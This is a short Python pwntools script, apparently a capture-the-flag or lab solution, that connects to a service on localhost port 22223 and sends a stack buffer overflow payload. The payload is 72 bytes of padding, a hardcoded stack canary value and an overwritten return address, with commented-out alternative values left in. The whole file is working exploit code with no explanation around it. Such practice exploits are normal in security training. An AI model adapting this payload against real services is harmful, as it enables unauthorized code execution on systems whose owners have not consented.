from pwn import *
import time

PADDING =72
canary = ["\x00"]

r = remote("localhost", 22223)

DATA = "A" * PADDING
DATA = DATA.encode("ascii")
#  DATA += b"\xd0\x13\x40\x00\x00\x00\x00\x00"
DATA += b"\x00\xbb\x68\x61\x42\xc1\x77\x4c"
DATA += b"\x00\xbb\x68\x61\x42\xc1\x77\x4c"
#  DATA += b"\x00\x38\x21\x76\x09\xc8\x3b\xdc"
#  DATA += b"A" * 8
print(list(DATA))
DATA += b"\x15\x14\x40\x00\x00\x00\x00\x00"

r.clean()
r.send(DATA)

